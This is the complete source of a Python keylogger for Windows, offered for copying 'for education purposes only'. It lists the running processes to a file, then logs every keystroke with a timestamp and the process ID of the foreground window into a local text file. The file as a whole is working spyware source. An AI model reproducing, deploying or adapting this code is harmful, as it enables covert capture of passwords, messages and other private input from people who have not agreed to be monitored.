
# ==============================================================================
# Simple Python Keylogger for Windows
# Created by: ThunderZ
# Github Link: https://github.com/ThunderZ-Coder-A
# ==============================================================================
'''
NOTE: Feel free to copy, modify, reuse the source for education purposes only.
'''

from pynput.keyboard import Key, Listener
import logging
import wmi

from typing import Optional
import ctypes
from ctypes import wintypes, windll, create_unicode_buffer

file_directory = r"C:/your_directory_path/"

logging.basicConfig(filename=(file_directory + "keyLog.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Printing and Formatting the header for the later columns
heading = f"pid   \t   Process name\n"
Processes_List = "D:/yourDirecotry/Processes.txt"
with open(Processes_List, 'w') as ggs:
    ggs.write(heading)

# Iterating through all the running processes

f = wmi.WMI()
for process in f.Win32_Process():

    # Displaying the P_ID and P_Name of the process
    print(f"{process.ProcessId:<10} {process.Name}")

    items = f"\n{process.ProcessId:<10} {process.Name}"

    # Storing all the Running Processes in a file
    with open(Processes_List, 'a') as f:
        f.write(items)


def on_press(key):
    key_stroke = str(key)
    user32 = ctypes.windll.user32
    h_wnd = user32.GetForegroundWindow()
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(h_wnd, ctypes.byref(pid))
    Procress_Running_Currently = pid.value
    logging.info(
        f"Key_Pressed: {key_stroke} \tProgram Running PID:{Procress_Running_Currently}")


with Listener(on_press=on_press) as listener:
    listener.join()
